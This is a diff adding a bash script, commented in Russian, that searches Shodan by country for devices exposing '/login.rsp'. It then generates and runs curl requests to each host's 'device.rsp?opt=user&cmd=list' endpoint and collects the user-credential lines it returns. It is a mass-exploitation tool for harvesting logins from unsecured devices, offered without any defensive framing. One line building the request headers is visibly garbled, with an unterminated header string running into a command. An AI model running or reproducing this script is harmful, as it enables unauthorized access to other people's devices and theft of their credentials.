@@ -1,0 +1,36 @@
+##shodan
+API_KEY=API
+echo "API=$API_KEY"
+echo Введите код страны
+read cod
+#Условие поиска
+SEARCH_FOR="html:'/login.rsp' country:'$cod'"
+echo $SEARCH_FOR
+shodan init $API_KEY
+#Поиск ip
+shodan search --fields ip_str $SEARCH_FOR --limit 10 > ip$cod
+#Поиск port
+shodan search --fields port $SEARCH_FOR --limit 10 > port$cod
+while read line; do echo "$line:"; done < ip$cod > ipp$cod
+paste ipp$cod port$cod > ok$cod
+#Удаляем пробелы
+sed s/'\s'//g -i ok$cod
+
+##Добавляем курл поиска логина, пароля
+
+while read line;
+do headers="'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q$echo "curl -m 10 'http://$line/device.rsp?opt=user&cmd=list' -H 'Connection: keep-alive' -H $headers | grep uid > txt_$line"; done < ok$cod > curl$cod
+
+chmod u+x curl$cod
+
+mkdir folder$cod
+
+cp curl$cod folder$cod/
+
+cd folder$cod
+
+./curl$cod &&
+
+find . -type f -empty -exec rm -rf {} \;
+
+grep uid txt* > result$cod
